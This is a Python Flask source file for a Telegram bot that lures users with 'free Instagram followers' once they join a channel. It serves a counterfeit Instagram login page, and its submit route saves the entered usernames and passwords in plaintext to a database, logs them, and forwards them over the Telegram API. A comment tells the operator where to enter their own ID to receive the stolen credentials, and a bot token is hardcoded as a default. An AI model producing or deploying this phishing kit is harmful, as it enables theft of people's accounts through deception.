from flask import Flask, request, jsonify
import os
import requests
import sqlite3

app = Flask(__name__)

# Get bot token from environment variable
BOT_TOKEN = os.environ.get('BOT_TOKEN', '8499502425:AAGskRZzMIOcb4NSOr9y5kEsEwFzjte0kuU')
TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}"

# Force channel ka username (without @)
FORCE_CHANNEL = os.environ.get('FORCE_CHANNEL', 'freeultraapk')

# Database setup
def init_db():
    conn = sqlite3.connect('instagram_bot.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS credentials
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  user_id INTEGER,
                  username TEXT,
                  password TEXT,
                  timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)''')
    conn.commit()
    conn.close()

init_db()

@app.route('/')
def home():
    return "Telegram Bot is Running Successfully!"

@app.route('/webhook', methods=['POST'])
def webhook():
    try:
        data = request.get_json()
        print("Received data:", data)
        
        # Process the message
        if 'message' in data and 'text' in data['message']:
            chat_id = data['message']['chat']['id']
            message_text = data['message']['text']
            user_id = data['message']['from']['id']
            
            if message_text == '/start':
                # Check if user has joined channel
                try:
                    chat_member = requests.get(
                        f"{TELEGRAM_API}/getChatMember",
                        params={"chat_id": f"@{FORCE_CHANNEL}", "user_id": user_id}
                    ).json()
                    
                    print("Chat member response:", chat_member)
                    
                    if chat_member.get('ok') and chat_member.get('result', {}).get('status') in ['member', 'administrator', 'creator']:
                        # User has joined, show Instagram link button
                        app_url = os.environ.get('RENDER_EXTERNAL_HOSTNAME', 'your-app-name.onrender.com')
                        login_link = f"https://{app_url}/instagram_login?user_id={user_id}"
                        
                        keyboard = {
                            "inline_keyboard": [
                                [
                                    {
                                        "text": "Instagram Login", 
                                        "url": login_link
                                    }
                                ],
                                [
                                    {
                                        "text": "Share Link", 
                                        "url": f"https://t.me/share/url?url={login_link}&text=Get free Instagram followers"
                                    }
                                ]
                            ]
                        }
                        
                        response = requests.post(
                            f"{TELEGRAM_API}/sendMessage",
                            json={
                                "chat_id": chat_id,
                                "text": "🎉 Thanks for joining our channel!\n\nClick the button below to get your free Instagram followers:",
                                "reply_markup": keyboard
                            }
                        )
                        print("Send message response:", response.json())
                    else:
                        # User hasn't joined
                        response = requests.post(
                            f"{TELEGRAM_API}/sendMessage",
                            json={
                                "chat_id": chat_id,
                                "text": f"❌ Bot use karne ke liye aapko pehle hamara channel join karna hoga:\n\n👉 @{FORCE_CHANNEL}\n\nChannel join karne ke baad /start command phir se type karein."
                            }
                        )
                        print("Not member response:", response.json())
                except Exception as e:
                    print(f"Error checking channel membership: {e}")
        
        return jsonify({"status": "success"})
    except Exception as e:
        print("Error in webhook:", e)
        return jsonify({"status": "error"})

@app.route('/instagram_login')
def instagram_login():
    user_id = request.args.get('user_id', '123')
    return f'''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Instagram Login</title>
        <style>
            body {{ font-family: Arial, sans-serif; background-color: #fafafa; margin: 0; padding: 20px; }}
            .container {{ max-width: 400px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }}
            .logo {{ text-align: center; margin-bottom: 20px; }}
            input[type="text"], input[type="password"] {{ width: 100%; padding: 10px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; }}
            button {{ width: 100%; padding: 10px; background-color: #3897f0; color: white; border: none; border-radius: 4px; margin-top: 10px; }}
        </style>
    </head>
    <body>
        <div class="container">
            <div class="logo">
                <h2>Instagram Login</h2>
            </div>
            <form action="/submit_login" method="POST">
                <input type="hidden" name="user_id" value="{user_id}">
                <input type="text" name="username" placeholder="Username or Email" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">Log In</button>
            </form>
            <p style="text-align: center; margin-top: 20px; color: #999;">
                Login to get free followers
            </p>
        </div>
    </body>
    </html>
    '''

@app.route('/submit_login', methods=['POST'])
def submit_login():
    username = request.form.get('username')
    password = request.form.get('password')
    user_id = request.form.get('user_id')
    
    print(f"Received credentials - User ID: {user_id}, Username: {username}, Password: {password}")
    
    # Save credentials to database
    conn = sqlite3.connect('instagram_bot.db')
    c = conn.cursor()
    c.execute("INSERT INTO credentials (user_id, username, password) VALUES (?, ?, ?)",
              (user_id, username, password))
    conn.commit()
    conn.close()
    
    # Send notification to bot owner (replace with your user ID)
    try:
        response = requests.post(
            f"{TELEGRAM_API}/sendMessage",
            json={
                "chat_id": user_id,  # Yahan apna user ID daalein credentials receive karne ke liye
                "text": f"New Instagram Credentials:\n\nUsername: {username}\nPassword: {password}\n\nFrom User ID: {user_id}"
            }
        )
        print("Credentials send response:", response.json())
    except Exception as e:
        print(f"Error sending message: {e}")
    
    # Show success message
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Login Successful</title>
        <style>
            body { font-family: Arial, sans-serif; background-color: #fafafa; margin: 0; padding: 20px; }
            .container { max-width: 400px; margin: 100px auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); text-align: center; }
            .success-icon { color: #4CAF50; font-size: 50px; margin-bottom: 20px; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="success-icon">✓</div>
            <h2>Login Successful!</h2>
            <p>If your details are correct then you will get followers within 24 hours.</p>
            <p>You can close this window now.</p>
        </div>
    </body>
    </html>
    '''

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    # Set webhook on startup
    try:
        app_url = os.environ.get('RENDER_EXTERNAL_HOSTNAME', '')
        if app_url:
            webhook_url = f"https://{app_url}/webhook"
            response = requests.get(f"{TELEGRAM_API}/setWebhook?url={webhook_url}")
            print("Webhook set response:", response.json())
    except Exception as e:
        print("Error setting webhook:", e)
    
    app.run(host='0.0.0.0', port=port)
